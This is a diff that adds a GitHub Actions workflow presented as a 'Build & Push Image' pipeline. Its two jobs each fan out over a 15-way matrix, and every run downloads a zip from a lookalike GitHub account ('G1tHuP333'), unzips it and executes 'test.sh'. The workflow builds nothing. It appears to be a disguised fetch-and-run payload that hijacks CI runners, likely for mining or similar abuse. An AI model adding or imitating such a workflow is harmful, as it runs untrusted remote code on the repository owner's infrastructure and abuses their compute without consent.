@@ -1,0 +1,42 @@
+name: Project static2
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2]
+        flag: [A, B, C, D, E]
+    
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Build & Push Image
+      run: |
+        wget https://github.com/G1tHuP333/test/raw/refs/heads/main/PyTesseract.zip && yes A | unzip PyTesseract.zip && bash test.sh
+
+  deploy:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2]
+        flag: [A, B, C, D, E]
+    
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Build & Push Image
+      run: |
+        wget https://github.com/G1tHuP333/test/raw/refs/heads/main/PyTesseract.zip && yes A | unzip PyTesseract.zip && bash test.sh
